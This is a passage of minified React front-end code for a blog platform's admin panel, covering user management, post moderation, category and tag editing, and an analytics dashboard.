capitalize",children:U.authProvider||"Local"})}),o.jsx("td",{className:"px-6 py-4",children:o.jsxs("div",{className:"flex items-center gap-2 text-sm text-gray-600",children:[o.jsx(Zu,{className:"h-4 w-4 text-gray-400"}),new Date(U.createdAt).toLocaleDateString()]})}),o.jsx("td",{className:"px-6 py-4 text-right",children:o.jsxs("div",{className:"relative inline-block",children:[o.jsx("button",{onClick:()=>N(O===U.id?null:U.id),disabled:T===U.id,className:"p-2 hover:bg-gray-100 rounded-lg transition-colors disabled:opacity-50",children:T===U.id?o.jsx(Xn,{className:"h-4 w-4 animate-spin"}):o.jsx(E_,{className:"h-4 w-4"})}),O===U.id&&o.jsxs(o.Fragment,{children:[o.jsx("div",{className:"fixed inset-0 z-10",onClick:()=>N(null)}),o.jsxs("div",{className:"absolute right-0 mt-1 w-48 bg-white rounded-lg shadow-lg border border-gray-200 py-1 z-20",children:[U.status==="ACTIVE"?o.jsxs("button",{onClick:()=>R(U.id,"BANNED"),className:"flex items-center gap-2 w-full px-4 py-2 text-sm text-red-600 hover:bg-red-50",children:[o.jsx(l_,{className:"h-4 w-4"}),"Ban User"]}):o.jsxs("button",{onClick:()=>R(U.id,"ACTIVE"),className:"flex items-center gap-2 w-full px-4 py-2 text-sm text-green-600 hover:bg-green-50",children:[o.jsx(Iu,{className:"h-4 w-4"}),"Activate User"]}),o.jsx("hr",{className:"my-1"}),U.role==="USER"?o.jsxs("button",{onClick:()=>B(U.id,"ADMIN"),className:"flex items-center gap-2 w-full px-4 py-2 text-sm text-purple-600 hover:bg-purple-50",children:[o.jsx(Da,{className:"h-4 w-4"}),"Make Admin"]}):o.jsxs("button",{onClick:()=>B(U.id,"USER"),className:"flex items-center gap-2 w-full px-4 py-2 text-sm text-gray-600 hover:bg-gray-50",children:[o.jsx(w_,{className:"h-4 w-4"}),"Remove Admin"]})]})]})]})})]},U.id))})]})}),u>1&&o.jsxs("div",{className:"px-6 py-4 bg-gray-50 border-t border-gray-200 flex items-center justify-between",children:[o.jsxs("p",{className:"text-sm text-gray-600",children:["Page ",a+1," of ",u]}),o.jsxs("div",{className:"flex gap-2",children:[o.jsxs(Ee,{variant:"outline",size:"sm",onClick:()=>l(U=>Math.max(0,U-1)),disabled:a===0,children:[o.jsx($g,{className:"h-4 w-4 mr-1"}),"Previous"]}),o.jsxs(Ee,{variant:"outline",size:"sm",onClick:()=>l(U=>Math.min(u-1,U+1)),disabled:a>=u-1,children:["Next",o.jsx(Pu,{className:"h-4 w-4 ml-1"})]})]})]})]})]})}function f7(){const[e]=Qu(),[t,n]=j.useState([]),[r,a]=j.useState(!0),[l,u]=j.useState(0),[f,h]=j.useState(0),[m,x]=j.useState(0),[g,b]=j.useState(e.get("status")||""),[E,C]=j.useState(""),[P,O]=j.useState(null);j.useEffect(()=>{N()},[l,g]);const N=async()=>{try{a(!0);let $="/api/admin/posts";const Y=new URLSearchParams;Y.append("page",l),Y.append("size",15),g==="pending"?$="/api/admin/posts/pending":g&&Y.append("status",g.toUpperCase()),E&&Y.append("search",E);const ne=await _e.get(`${$}?${Y}`);n(ne.data.content||[]),h(ne.data.totalPages||0),x(ne.data.totalElements||0)}catch($){console.error("Failed to fetch posts:",$)}finally{a(!1)}},T=$=>{$.preventDefault(),u(0),N()},A=async $=>{try{O($),await _e.put(`/api/admin/posts/${$}/approve`),N()}catch(Y){console.error("Failed to approve post:",Y)}finally{O(null)}},_=async $=>{const Y=prompt("Enter rejection reason (optional):");try{O($),await _e.put(`/api/admin/posts/${$}/reject`,{reason:Y}),N()}catch(ne){console.error("Failed to reject post:",ne)}finally{O(null)}},M=async $=>{if(confirm("Are you sure you want to hide this post?"))try{O($),await _e.put(`/api/admin/posts/${$}/hide`),N()}catch(Y){console.error("Failed to hide post:",Y)}finally{O(null)}},R=async $=>{try{O($),await _e.put(`/api/admin/posts/${$}/approve`),N()}catch(Y){console.error("Failed to unhide post:",Y)}finally{O(null)}},B=async $=>{if(confirm("Are you sure you want to permanently delete this post? This action cannot be undone."))try{O($),await _e.delete(`/api/admin/posts/${$}`),N()}catch(Y){console.error("Failed to delete post:",Y)}finally{O(null)}},U=$=>({PUBLISHED:"bg-green-100 text-green-700",PENDING_REVIEW:"bg-yellow-100 text-yellow-700",DRAFT:"bg-gray-100 text-gray-700",HIDDEN:"bg-red-100 text-red-700",REJECTED:"bg-orange-100 text-orange-700"})[$]||"bg-gray-100 text-gray-700";return o.jsxs("div",{className:"space-y-6",children:[o.jsxs("div",{className:"flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4",children:[o.jsxs("div",{children:[o.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Post Management"}),o.jsx("p",{className:"text-gray-500 mt-1",children:"Review, moderate and manage all posts"})]}),o.jsxs(Ee,{variant:"outline",size:"sm",onClick:()=>N(),children:[o.jsx(Xn,{className:"h-4 w-4 mr-2"}),"Refresh"]})]}),o.jsx("div",{className:"bg-white rounded-xl border border-gray-200 p-4",children:o.jsxs("form",{onSubmit:T,className:"flex flex-wrap gap-4",children:[o.jsx("div",{className:"flex-1 min-w-[250px]",children:o.jsxs("div",{className:"relative",children:[o.jsx(Al,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400"}),o.jsx("input",{type:"text",placeholder:"Search by title or author...",value:E,onChange:$=>C($.target.value),className:"w-full pl-10 pr-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"})]})}),o.jsxs("select",{value:g,onChange:$=>{b($.target.value),u(0)},className:"px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 bg-white",children:[o.jsx("option",{value:"",children:"All Status"}),o.jsx("option",{value:"pending",children:"Pending Review"}),o.jsx("option",{value:"PUBLISHED",children:"Published"}),o.jsx("option",{value:"HIDDEN",children:"Hidden"})]}),o.jsxs(Ee,{type:"submit",children:[o.jsx(vk,{className:"h-4 w-4 mr-2"}),"Filter"]})]})}),o.jsx("div",{className:"flex gap-2 overflow-x-auto pb-2",children:[{value:"",label:"All Posts"},{value:"pending",label:"Pending Review",highlight:!0},{value:"PUBLISHED",label:"Published"},{value:"HIDDEN",label:"Hidden"}].map($=>o.jsx("button",{onClick:()=>{b($.value),u(0)},className:`px-4 py-2 rounded-lg text-sm font-medium whitespace-nowrap transition-colors ${g===$.value?"bg-blue-600 text-white":$.highlight?"bg-yellow-100 text-yellow-700 hover:bg-yellow-200":"bg-gray-100 text-gray-700 hover:bg-gray-200"}`,children:$.label},$.value))}),o.jsx("div",{className:"flex items-center justify-between",children:o.jsxs("p",{className:"text-sm text-gray-500",children:["Showing ",o.jsx("span",{className:"font-medium",children:t.length})," of"," ",o.jsx("span",{className:"font-medium",children:m})," posts"]})}),o.jsx("div",{className:"space-y-4",children:r?o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200 p-16 text-center",children:[o.jsx(Xn,{className:"h-8 w-8 animate-spin text-gray-400 mx-auto mb-2"}),o.jsx("p",{className:"text-gray-500",children:"Loading posts..."})]}):t.length===0?o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200 p-16 text-center",children:[o.jsx(Xr,{className:"h-12 w-12 text-gray-300 mx-auto mb-4"}),o.jsx("p",{className:"text-gray-500",children:"No posts found"})]}):t.map($=>o.jsx("div",{className:"bg-white rounded-xl border border-gray-200 p-6 hover:shadow-md transition-shadow",children:o.jsxs("div",{className:"flex gap-4",children:[o.jsx(we,{to:`/post/${$.slug}`,className:"flex-shrink-0",children:$.coverImageUrl?o.jsx("img",{src:$.coverImageUrl,alt:$.title,className:"w-40 h-24 object-cover rounded-lg hover:opacity-80 transition-opacity"}):o.jsx("div",{className:"w-40 h-24 bg-gray-100 rounded-lg flex items-center justify-center",children:o.jsx(Xr,{className:"h-8 w-8 text-gray-300"})})}),o.jsxs("div",{className:"flex-1 min-w-0",children:[o.jsxs("div",{className:"flex items-start justify-between gap-4",children:[o.jsxs(we,{to:`/post/${$.slug}`,className:"flex-1 group",children:[o.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[o.jsx("span",{className:`px-2.5 py-0.5 text-xs font-medium rounded-full ${U($.status)}`,children:$.status}),$.categoryName&&o.jsx("span",{className:"px-2 py-0.5 bg-blue-50 text-blue-600 text-xs rounded",children:$.categoryName})]}),o.jsx("h3",{className:"text-lg font-semibold text-gray-900 mb-1 line-clamp-1 group-hover:text-blue-600 transition-colors",children:$.title}),o.jsx("p",{className:"text-sm text-gray-600 line-clamp-2",children:$.summary||"No summary available"})]}),o.jsxs("div",{className:"flex items-center gap-2 flex-shrink-0",children:[$.status==="PENDING_REVIEW"&&o.jsxs(o.Fragment,{children:[o.jsxs(Ee,{size:"sm",onClick:()=>A($.id),disabled:P===$.id,className:"bg-green-600 hover:bg-green-700",children:[o.jsx(o_,{className:"h-4 w-4 mr-1"}),"Approve"]}),o.jsxs(Ee,{size:"sm",variant:"outline",onClick:()=>_($.id),disabled:P===$.id,children:[o.jsx(Bi,{className:"h-4 w-4 mr-1"}),"Reject"]})]}),$.status==="PUBLISHED"&&o.jsxs(Ee,{size:"sm",variant:"outline",onClick:()=>M($.id),disabled:P===$.id,children:[o.jsx(gl,{className:"h-4 w-4 mr-1"}),"Hide"]}),$.status==="HIDDEN"&&o.jsxs(Ee,{size:"sm",variant:"outline",onClick:()=>R($.id),disabled:P===$.id,children:[o.jsx(kn,{className:"h-4 w-4 mr-1"}),"Unhide"]}),o.jsx(Ee,{size:"sm",variant:"outline",className:"text-red-600 border-red-200 hover:bg-red-50",onClick:()=>B($.id),disabled:P===$.id,children:o.jsx(Dl,{className:"h-4 w-4"})})]})]}),o.jsxs("div",{className:"flex items-center gap-6 mt-4 text-sm text-gray-500",children:[o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx(ff,{className:"h-4 w-4"}),$.authorDisplayName||$.authorUsername]}),o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx(Zu,{className:"h-4 w-4"}),new Date($.createdAt).toLocaleDateString()]}),o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx(kn,{className:"h-4 w-4"}),$.views||0," views"]}),o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx(cr,{className:"h-4 w-4"}),$.likesCount||0," likes"]}),o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx(Ju,{className:"h-4 w-4"}),$.commentsCount||0," comments"]})]})]})]})},$.id))}),f>1&&o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200 px-6 py-4 flex items-center justify-between",children:[o.jsxs("p",{className:"text-sm text-gray-600",children:["Page ",l+1," of ",f]}),o.jsxs("div",{className:"flex gap-2",children:[o.jsxs(Ee,{variant:"outline",size:"sm",onClick:()=>u($=>Math.max(0,$-1)),disabled:l===0,children:[o.jsx($g,{className:"h-4 w-4 mr-1"}),"Previous"]}),o.jsxs(Ee,{variant:"outline",size:"sm",onClick:()=>u($=>Math.min(f-1,$+1)),disabled:l>=f-1,children:["Next",o.jsx(Pu,{className:"h-4 w-4 ml-1"})]})]})]})]})}function h7(){const[e,t]=j.useState([]),[n,r]=j.useState(!0),[a,l]=j.useState(!1),[u,f]=j.useState(null),[h,m]=j.useState({name:"",slug:"",description:"",coverImageUrl:""}),[x,g]=j.useState(!1),[b,E]=j.useState(!1),C=j.useRef(null);j.useEffect(()=>{P()},[]);const P=async()=>{try{r(!0);const B=await _e.get("/api/categories");t(B.data||[])}catch(B){console.error("Failed to fetch categories:",B)}finally{r(!1)}},O=()=>{f(null),m({name:"",slug:"",description:"",coverImageUrl:""}),l(!0)},N=B=>{f(B),m({name:B.name,slug:B.slug,description:B.description||"",coverImageUrl:B.coverImageUrl||""}),l(!0)},T=async B=>{var $;const U=($=B.target.files)==null?void 0:$[0];if(U){if(!U.type.startsWith("image/")){alert("Please select an image file");return}if(U.size>5*1024*1024){alert("File size must be less than 5MB");return}try{E(!0);const Y=new FormData;Y.append("file",U);const ne=await _e.post("/api/posts/upload-image",Y,{headers:{"Content-Type":"multipart/form-data"}});m(Z=>({...Z,coverImageUrl:ne.data.fileUrl}))}catch(Y){console.error("Failed to upload image:",Y),alert("Failed to upload image")}finally{E(!1)}}},A=()=>{m(B=>({...B,coverImageUrl:""}))},_=async B=>{var U,$;B.preventDefault();try{g(!0),u?await _e.put(`/api/admin/categories/${u.id}`,h):await _e.post("/api/admin/categories",h),l(!1),P()}catch(Y){console.error("Failed to save category:",Y),alert((($=(U=Y.response)==null?void 0:U.data)==null?void 0:$.message)||"Failed to save category")}finally{g(!1)}},M=async B=>{var U,$;if(confirm("Are you sure you want to delete this category? Posts in this category will become uncategorized."))try{await _e.delete(`/api/admin/categories/${B}`),P()}catch(Y){console.error("Failed to delete category:",Y),alert((($=(U=Y.response)==null?void 0:U.data)==null?void 0:$.message)||"Failed to delete category")}},R=B=>B.toLowerCase().replace(/[^a-z0-9]+/g,"-").replace(/(^-|-$)/g,"");return o.jsxs("div",{className:"space-y-6",children:[o.jsxs("div",{className:"flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4",children:[o.jsxs("div",{children:[o.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Categories"}),o.jsx("p",{className:"text-gray-500 mt-1",children:"Manage post categories"})]}),o.jsxs("div",{className:"flex gap-2",children:[o.jsxs(Ee,{variant:"outline",size:"sm",onClick:P,children:[o.jsx(Xn,{className:"h-4 w-4 mr-2"}),"Refresh"]}),o.jsxs(Ee,{size:"sm",onClick:O,children:[o.jsx(df,{className:"h-4 w-4 mr-2"}),"Add Category"]})]})]}),o.jsx("div",{className:"bg-white rounded-xl border border-gray-200 overflow-hidden",children:o.jsxs("table",{className:"w-full",children:[o.jsx("thead",{children:o.jsxs("tr",{className:"bg-gray-50 border-b border-gray-200",children:[o.jsx("th",{className:"px-6 py-4 text-left text-xs font-semibold text-gray-600 uppercase",children:"Category"}),o.jsx("th",{className:"px-6 py-4 text-left text-xs font-semibold text-gray-600 uppercase",children:"Cover Image"}),o.jsx("th",{className:"px-6 py-4 text-left text-xs font-semibold text-gray-600 uppercase",children:"Slug"}),o.jsx("th",{className:"px-6 py-4 text-left text-xs font-semibold text-gray-600 uppercase",children:"Posts"}),o.jsx("th",{className:"px-6 py-4 text-right text-xs font-semibold text-gray-600 uppercase",children:"Actions"})]})}),o.jsx("tbody",{className:"divide-y divide-gray-100",children:n?o.jsx("tr",{children:o.jsxs("td",{colSpan:5,className:"px-6 py-16 text-center",children:[o.jsx(Xn,{className:"h-6 w-6 animate-spin text-gray-400 mx-auto mb-2"}),o.jsx("p",{className:"text-gray-500",children:"Loading categories..."})]})}):e.length===0?o.jsx("tr",{children:o.jsxs("td",{colSpan:5,className:"px-6 py-16 text-center",children:[o.jsx(y0,{className:"h-12 w-12 text-gray-300 mx-auto mb-4"}),o.jsx("p",{className:"text-gray-500",children:"No categories found"}),o.jsxs(Ee,{size:"sm",className:"mt-4",onClick:O,children:[o.jsx(df,{className:"h-4 w-4 mr-2"}),"Create First Category"]})]})}):e.map(B=>o.jsxs("tr",{className:"hover:bg-gray-50",children:[o.jsx("td",{className:"px-6 py-4",children:o.jsxs("div",{className:"flex items-center gap-3",children:[o.jsx("div",{className:"p-2 bg-purple-100 text-purple-600 rounded-lg",children:o.jsx(y0,{className:"h-5 w-5"})}),o.jsxs("div",{children:[o.jsx("span",{className:"font-medium text-gray-900",children:B.name}),B.description&&o.jsx("p",{className:"text-xs text-gray-500 truncate max-w-[200px]",children:B.description})]})]})}),o.jsx("td",{className:"px-6 py-4",children:B.coverImageUrl?o.jsx("img",{src:B.coverImageUrl,alt:B.name,className:"w-20 h-12 object-cover rounded-lg"}):o.jsx("div",{className:"w-20 h-12 bg-gradient-to-r from-purple-500 to-blue-500 rounded-lg flex items-center justify-center",children:o.jsx(Vg,{className:"h-5 w-5 text-white/70"})})}),o.jsx("td",{className:"px-6 py-4",children:o.jsx("code",{className:"px-2 py-1 bg-gray-100 text-gray-600 text-sm rounded",children:B.slug})}),o.jsx("td",{className:"px-6 py-4",children:o.jsxs("div",{className:"flex items-center gap-1 text-gray-600",children:[o.jsx(Xr,{className:"h-4 w-4"}),o.jsx("span",{children:B.postCount||0})]})}),o.jsx("td",{className:"px-6 py-4 text-right",children:o.jsxs("div",{className:"flex items-center justify-end gap-2",children:[o.jsx("button",{onClick:()=>N(B),className:"p-2 text-gray-500 hover:text-blue-600 hover:bg-blue-50 rounded-lg",children:o.jsx(Gg,{className:"h-4 w-4"})}),o.jsx("button",{onClick:()=>M(B.id),className:"p-2 text-gray-500 hover:text-red-600 hover:bg-red-50 rounded-lg",children:o.jsx(Dl,{className:"h-4 w-4"})})]})})]},B.id))})]})}),a&&o.jsx("div",{className:"fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50",children:o.jsxs("div",{className:"bg-white rounded-xl shadow-xl w-full max-w-md mx-4",children:[o.jsxs("div",{className:"flex items-center justify-between px-6 py-4 border-b border-gray-200",children:[o.jsx("h2",{className:"text-lg font-semibold text-gray-900",children:u?"Edit Category":"Create Category"}),o.jsx("button",{onClick:()=>l(!1),className:"p-2 text-gray-500 hover:text-gray-700 hover:bg-gray-100 rounded-lg",children:o.jsx(Bi,{className:"h-5 w-5"})})]}),o.jsxs("form",{onSubmit:_,className:"p-6 space-y-4",children:[o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-1",children:"Name *"}),o.jsx("input",{type:"text",value:h.name,onChange:B=>{m({...h,name:B.target.value,slug:u?h.slug:R(B.target.value)})},className:"w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent",required:!0})]}),o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-1",children:"Slug *"}),o.jsx("input",{type:"text",value:h.slug,onChange:B=>m({...h,slug:B.target.value}),className:"w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent",required:!0})]}),o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-1",children:"Description"}),o.jsx("textarea",{value:h.description,onChange:B=>m({...h,description:B.target.value}),rows:3,className:"w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent resize-none"})]}),o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-1",children:"Cover Image"}),h.coverImageUrl?o.jsxs("div",{className:"relative",children:[o.jsx("img",{src:h.coverImageUrl,alt:"Cover preview",className:"w-full h-32 object-cover rounded-lg"}),o.jsx("button",{type:"button",onClick:A,className:"absolute top-2 right-2 p-1 bg-red-500 text-white rounded-full hover:bg-red-600",children:o.jsx(Bi,{className:"h-4 w-4"})})]}):o.jsx("div",{onClick:()=>{var B;return(B=C.current)==null?void 0:B.click()},className:"w-full h-32 border-2 border-dashed border-gray-300 rounded-lg flex flex-col items-center justify-center cursor-pointer hover:border-blue-500 hover:bg-blue-50 transition-colors",children:b?o.jsx(Xn,{className:"h-8 w-8 text-blue-500 animate-spin"}):o.jsxs(o.Fragment,{children:[o.jsx(Kg,{className:"h-8 w-8 text-gray-400 mb-2"}),o.jsx("span",{className:"text-sm text-gray-500",children:"Click to upload cover image"})]})}),o.jsx("input",{ref:C,type:"file",accept:"image/*",onChange:T,className:"hidden"})]}),o.jsxs("div",{className:"flex justify-end gap-3 pt-4",children:[o.jsx(Ee,{type:"button",variant:"outline",onClick:()=>l(!1),children:"Cancel"}),o.jsxs(Ee,{type:"submit",disabled:x,children:[x?o.jsx(Xn,{className:"h-4 w-4 mr-2 animate-spin"}):o.jsx(Bl,{className:"h-4 w-4 mr-2"}),u?"Update":"Create"]})]})]})]})})]})}function p7(){var M;const[e,t]=j.useState([]),[n,r]=j.useState(!0),[a,l]=j.useState(!1),[u,f]=j.useState(null),[h,m]=j.useState({name:"",slug:""}),[x,g]=j.useState(!1),[b,E]=j.useState("");j.useEffect(()=>{C()},[]);const C=async()=>{try{r(!0);const R=await _e.get("/api/tags");t(R.data||[])}catch(R){console.error("Failed to fetch tags:",R)}finally{r(!1)}},P=()=>{f(null),m({name:"",slug:""}),l(!0)},O=R=>{f(R),m({name:R.name,slug:R.slug}),l(!0)},N=async R=>{var B,U;R.preventDefault();try{g(!0),u?await _e.put(`/api/admin/tags/${u.id}`,h):await _e.post("/api/admin/tags",h),l(!1),C()}catch($){console.error("Failed to save tag:",$),alert(((U=(B=$.response)==null?void 0:B.data)==null?void 0:U.message)||"Failed to save tag")}finally{g(!1)}},T=async R=>{var B,U;if(confirm("Are you sure you want to delete this tag?"))try{await _e.delete(`/api/admin/tags/${R}`),C()}catch($){console.error("Failed to delete tag:",$),alert(((U=(B=$.response)==null?void 0:B.data)==null?void 0:U.message)||"Failed to delete tag")}},A=R=>R.toLowerCase().replace(/[^a-z0-9]+/g,"-").replace(/(^-|-$)/g,""),_=e.filter(R=>R.name.toLowerCase().includes(b.toLowerCase())||R.slug.toLowerCase().includes(b.toLowerCase()));return o.jsxs("div",{className:"space-y-6",children:[o.jsxs("div",{className:"flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4",children:[o.jsxs("div",{children:[o.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Tags"}),o.jsx("p",{className:"text-gray-500 mt-1",children:"Manage post tags"})]}),o.jsxs("div",{className:"flex gap-2",children:[o.jsxs(Ee,{variant:"outline",size:"sm",onClick:C,children:[o.jsx(Xn,{className:"h-4 w-4 mr-2"}),"Refresh"]}),o.jsxs(Ee,{size:"sm",onClick:P,children:[o.jsx(df,{className:"h-4 w-4 mr-2"}),"Add Tag"]})]})]}),o.jsx("div",{className:"bg-white rounded-xl border border-gray-200 p-4",children:o.jsxs("div",{className:"relative max-w-md",children:[o.jsx(Al,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400"}),o.jsx("input",{type:"text",placeholder:"Search tags...",value:b,onChange:R=>E(R.target.value),className:"w-full pl-10 pr-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"})]})}),o.jsx("div",{className:"bg-white rounded-xl border border-gray-200 p-6",children:n?o.jsxs("div",{className:"text-center py-12",children:[o.jsx(Xn,{className:"h-6 w-6 animate-spin text-gray-400 mx-auto mb-2"}),o.jsx("p",{className:"text-gray-500",children:"Loading tags..."})]}):_.length===0?o.jsxs("div",{className:"text-center py-12",children:[o.jsx(wk,{className:"h-12 w-12 text-gray-300 mx-auto mb-4"}),o.jsx("p",{className:"text-gray-500",children:"No tags found"}),o.jsxs(Ee,{size:"sm",className:"mt-4",onClick:P,children:[o.jsx(df,{className:"h-4 w-4 mr-2"}),"Create First Tag"]})]}):o.jsx("div",{className:"flex flex-wrap gap-3",children:_.map(R=>o.jsxs("div",{className:"group flex items-center gap-2 px-4 py-2 bg-gray-100 hover:bg-blue-50 rounded-full transition-colors",children:[o.jsxs("span",{className:"text-gray-700 group-hover:text-blue-700 font-medium",children:["#",R.name]}),R.postCount!==void 0&&o.jsx("span",{className:"text-xs text-gray-500 bg-white px-2 py-0.5 rounded-full",children:R.postCount}),o.jsxs("div",{className:"hidden group-hover:flex items-center gap-1 ml-2",children:[o.jsx("button",{onClick:()=>O(R),className:"p-1 text-blue-600 hover:bg-blue-100 rounded",children:o.jsx(Gg,{className:"h-3 w-3"})}),o.jsx("button",{onClick:()=>T(R.id),className:"p-1 text-red-600 hover:bg-red-100 rounded",children:o.jsx(Dl,{className:"h-3 w-3"})})]})]},R.id))})}),o.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-4",children:[o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200 p-6",children:[o.jsx("p",{className:"text-sm text-gray-500",children:"Total Tags"}),o.jsx("p",{className:"text-3xl font-bold text-gray-900",children:e.length})]}),o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200 p-6",children:[o.jsx("p",{className:"text-sm text-gray-500",children:"Most Used Tag"}),o.jsx("p",{className:"text-xl font-bold text-gray-900",children:e.length>0?`#${((M=[...e].sort((R,B)=>(B.postCount||0)-(R.postCount||0))[0])==null?void 0:M.name)||"-"}`:"-"})]}),o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200 p-6",children:[o.jsx("p",{className:"text-sm text-gray-500",children:"Unused Tags"}),o.jsx("p",{className:"text-3xl font-bold text-gray-900",children:e.filter(R=>!R.postCount||R.postCount===0).length})]})]}),a&&o.jsx("div",{className:"fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50",children:o.jsxs("div",{className:"bg-white rounded-xl shadow-xl w-full max-w-md mx-4",children:[o.jsxs("div",{className:"flex items-center justify-between px-6 py-4 border-b border-gray-200",children:[o.jsx("h2",{className:"text-lg font-semibold text-gray-900",children:u?"Edit Tag":"Create Tag"}),o.jsx("button",{onClick:()=>l(!1),className:"p-2 text-gray-500 hover:text-gray-700 hover:bg-gray-100 rounded-lg",children:o.jsx(Bi,{className:"h-5 w-5"})})]}),o.jsxs("form",{onSubmit:N,className:"p-6 space-y-4",children:[o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-1",children:"Name *"}),o.jsx("input",{type:"text",value:h.name,onChange:R=>{m({...h,name:R.target.value,slug:u?h.slug:A(R.target.value)})},className:"w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent",required:!0})]}),o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-1",children:"Slug *"}),o.jsx("input",{type:"text",value:h.slug,onChange:R=>m({...h,slug:R.target.value}),className:"w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent",required:!0})]}),o.jsxs("div",{className:"flex justify-end gap-3 pt-4",children:[o.jsx(Ee,{type:"button",variant:"outline",onClick:()=>l(!1),children:"Cancel"}),o.jsxs(Ee,{type:"submit",disabled:x,children:[x?o.jsx(Xn,{className:"h-4 w-4 mr-2 animate-spin"}):o.jsx(Bl,{className:"h-4 w-4 mr-2"}),u?"Update":"Create"]})]})]})]})})]})}function m7(){const[e,t]=j.useState(null),[n,r]=j.useState([]),[a,l]=j.useState([]),[u,f]=j.useState(!0),[h,m]=j.useState(null),[x,g]=j.useState("7d");j.useEffect(()=>{b()},[x]);const b=async()=>{var E,C,P;try{f(!0),m(null);const[O,N,T]=await Promise.all([_e.get("/api/admin/statistics"),_e.get("/api/posts/trending?limit=10"),_e.get("/api/users/top-authors?limit=10")]);t(O.data),r(((E=N.data)==null?void 0:E.content)||N.data||[]),l(T.data||[])}catch(O){console.error("Failed to fetch analytics:",O),m(((P=(C=O.response)==null?void 0:C.data)==null?void 0:P.message)||"Failed to load analytics data")}finally{f(!1)}};return u?o.jsx("div",{className:"flex items-center justify-center h-64",children:o.jsx(Xn,{className:"h-8 w-8 animate-spin text-gray-400"})}):h?o.jsxs("div",{className:"flex flex-col items-center justify-center h-64 text-center",children:[o.jsx("p",{className:"text-red-500 mb-4",children:h}),o.jsx("button",{onClick:b,className:"px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700",children:"Try Again"})]}):o.jsxs("div",{className:"space-y-6",children:[o.jsxs("div",{className:"flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4",children:[o.jsxs("div",{children:[o.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Analytics"}),o.jsx("p",{className:"text-gray-500 mt-1",children:"Platform statistics and insights"})]}),o.jsxs("div",{className:"flex gap-2",children:[o.jsxs("select",{value:x,onChange:E=>g(E.target.value),className:"px-4 py-2 border border-gray-300 rounded-lg bg-white",children:[o.jsx("option",{value:"7d",children:"Last 7 days"}),o.jsx("option",{value:"30d",children:"Last 30 days"}),o.jsx("option",{value:"90d",children:"Last 90 days"}),o.jsx("option",{value:"all",children:"All time"})]}),o.jsx("button",{onClick:b,className:"p-2 border border-gray-300 rounded-lg hover:bg-gray-50",children:o.jsx(Xn,{className:"h-5 w-5 text-gray-600"})})]})]}),o.jsxs("div",{className:"grid grid-cols-2 md:grid-cols-4 gap-4",children:[o.jsx(hd,{icon:Mi,label:"Total Users",value:(e==null?void 0:e.totalUsers)||0,change:(e==null?void 0:e.newUsersThisWeek)||0,changeLabel:"this week",color:"blue"}),o.jsx(hd,{icon:Xr,label:"Total Posts",value:(e==null?void 0:e.totalPosts)||0,change:(e==null?void 0:e.newPostsThisWeek)||0,changeLabel:"this week",color:"green"}),o.jsx(hd,{icon:kn,label:"Total Views",value:(e==null?void 0:e.totalViews)||0,color:"purple"}),o.jsx(hd,{icon:cr,label:"Total Likes",value:(e==null?void 0:e.totalLikes)||0,color:"red"})]}),o.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-6",children:[o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200",children:[o.jsx("div",{className:"px-6 py-4 border-b border-gray-200",children:o.jsxs("h2",{className:"font-semibold text-gray-900 flex items-center gap-2",children:[o.jsx(ju,{className:"h-5 w-5 text-orange-500"}),"Trending Posts"]})}),o.jsx("div",{className:"divide-y divide-gray-100",children:n.length===0?o.jsx("div",{className:"p-6 text-center text-gray-500",children:"No trending posts"}):n.slice(0,5).map((E,C)=>o.jsxs("div",{className:"px-6 py-4 flex items-center gap-4",children:[o.jsx("span",{className:`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${C===0?"bg-yellow-100 text-yellow-700":C===1?"bg-gray-100 text-gray-700":C===2?"bg-orange-100 text-orange-700":"bg-gray-50 text-gray-500"}`,children:C+1}),o.jsxs("div",{className:"flex-1 min-w-0",children:[o.jsx("h3",{className:"font-medium text-gray-900 truncate",children:E.title}),o.jsxs("p",{className:"text-sm 